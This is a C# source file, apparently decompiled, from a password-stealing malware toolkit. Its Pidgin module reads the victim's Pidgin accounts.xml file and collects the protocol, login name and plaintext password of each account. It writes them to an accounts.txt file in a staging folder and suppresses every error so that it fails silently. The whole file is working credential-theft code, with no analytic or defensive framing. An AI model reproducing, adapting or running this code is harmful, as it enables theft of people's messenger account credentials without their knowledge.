using System.IO;
using System.Text;
using System.Xml;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Messengers;

internal sealed class Pidgin
{
	private static StringBuilder SBTwo = new StringBuilder();

	private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple\\accounts.xml");

	public static void GetAccounts(string sSavePath)
	{
		if (!File.Exists(PidginPath))
		{
			return;
		}
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(new XmlTextReader(PidginPath));
			foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes)
			{
				string innerText = childNode.ChildNodes[0]!.InnerText;
				string innerText2 = childNode.ChildNodes[1]!.InnerText;
				string innerText3 = childNode.ChildNodes[2]!.InnerText;
				if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
				{
					SBTwo.AppendLine("Protocol: " + innerText);
					SBTwo.AppendLine("Login: " + innerText2);
					SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
					Counter.Pidgin++;
					continue;
				}
				break;
			}
			if (SBTwo.Length > 0)
			{
				Directory.CreateDirectory(sSavePath);
				File.AppendAllText(sSavePath + "\\accounts.txt", SBTwo.ToString());
			}
		}
		catch
		{
		}
	}
}
